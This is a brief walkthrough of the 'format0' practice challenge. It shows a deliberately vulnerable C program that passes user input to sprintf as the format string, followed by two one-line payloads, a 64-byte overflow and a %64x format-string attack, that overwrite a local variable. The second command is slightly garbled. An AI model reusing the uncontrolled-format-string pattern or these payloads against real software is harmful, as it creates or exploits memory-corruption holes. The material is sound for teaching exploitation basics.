So let’s take a look at the source code…

```
include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

So looking at this code, it establish an integer and sets it 0, it establishes a buffer, and then it takes an argument supplied to the program and uses the sprintf function to copy it over to the buffer. Then it checks to see if the integer it established is equal to 0xdeadbeef.


So there are two ways we can go about this. We can do a buffer overflow, since it is writing data to a buffer we can just overflow that buffer and write to the integer.

```
./format0 `python -c ‘print “1”*64 + “\xed\xbe\xad\xde”’`
you have hit the target correctly :)
```

The other way we can go about this is a string format attack. Since the sprintf is writing data to the buffer, we can just format it so it will write data to where the buffer is and overwrite the value of the integer. The % marks it as a flag, the 64 designates that it will be 64 bytes away from the initial point so we can skip over the buffer, and the x stands for unsigned hexadecimal integer.

```
./format0 `python -c %64x`python -c ‘print “\xef\xbe\xad\xde”’` 
you have hit the target correctly :)
```

And you have pwned the program.
